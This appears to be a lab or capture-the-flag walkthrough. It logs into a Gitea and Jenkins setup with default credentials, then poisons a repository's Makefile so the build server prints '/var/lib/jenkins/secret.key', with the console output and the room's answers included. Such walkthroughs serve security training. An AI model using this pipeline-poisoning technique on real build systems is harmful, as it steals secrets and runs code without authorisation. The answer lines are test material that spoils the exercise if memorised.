
Gitea
URL: http://10.10.24.222:3000
guest:password123

Jenkins
URL: http://10.10.24.222:8080
admin:admin

Clone the app repository
```bash
git clone http://10.10.24.222:3000/McHoneyBell/gift-wrapper.git
```
Modify Makefile
```makefile
build:
    uname -r
    cat /var/lib/jenkins/secret.key
```
Commit and push
```bash
git add Makefile
git commit -m "Add uname and secret.key"
git push
```

Trigger build on Jenkins, look in console output for uname and secret.key
```
...
+ make
uname -r
5.4.0-1029-aws
cat /var/lib/jenkins/secret.key
90e748eafdd2af4746a5ef7941e63272f24f1e33a2882f614ebfa6742e772ba7
...
```

# What Linux kernel version is the Jenkins node?
5.4.0-1029-aws

# What value is found from /var/lib/jenkins/secret.key?
90e748eafdd2af4746a5ef7941e63272f24f1e33a2882f614ebfa6742e772ba7
